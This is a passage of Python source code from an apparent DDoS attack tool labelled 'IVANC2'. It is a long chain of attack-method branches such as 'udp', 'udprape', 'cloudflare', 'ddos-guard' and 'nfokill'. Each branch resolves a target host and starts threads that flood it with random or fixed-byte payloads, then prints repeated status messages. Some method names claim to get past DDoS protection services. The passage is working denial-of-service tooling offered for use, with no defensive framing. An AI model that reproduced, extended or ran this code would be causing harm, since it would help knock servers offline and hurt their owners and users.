					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 655502
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 66890
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 88291
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 2000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 88345
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpstresser":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 70547
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 995500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfokill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[IVANC2] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
